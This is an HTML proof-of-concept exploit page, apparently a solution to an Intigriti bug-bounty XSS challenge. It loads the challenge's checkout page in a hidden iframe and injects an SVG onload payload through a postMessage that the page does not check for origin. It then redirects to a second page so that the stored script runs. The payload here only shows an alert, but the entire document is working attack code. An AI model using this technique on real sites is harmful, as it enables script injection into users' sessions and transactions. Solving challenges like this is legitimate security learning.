<!DOCTYPE html>
<body>
<script>
const BASE = 'https://challenge-0126.intigriti.io';

// XSS payload - use svg onload for immediate execution
const xss = '<svg onload=alert("gigawatz")>';

// Create iframe to checkout page
const iframe = document.createElement('iframe');
iframe.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
iframe.style.display = 'none';
document.body.appendChild(iframe);

iframe.onload = () => {
  setTimeout(() => {
    // Send malicious postMessage (no origin validation!)
    // Try both nickname and toAddress fields
    iframe.contentWindow.postMessage({
      type: 'submitTransaction',
      transaction: {
        nickname: xss,
        toAddress: '0x' + xss,
        currency: '1337COIN',
        amount: 1
      }
    }, '*');

    // Navigate to marketwatch to trigger XSS
    setTimeout(() => {
      window.location = `${BASE}/marketwatch.html`;
    }, 2000);
  }, 2000);
};
</script>
</body>
</html>
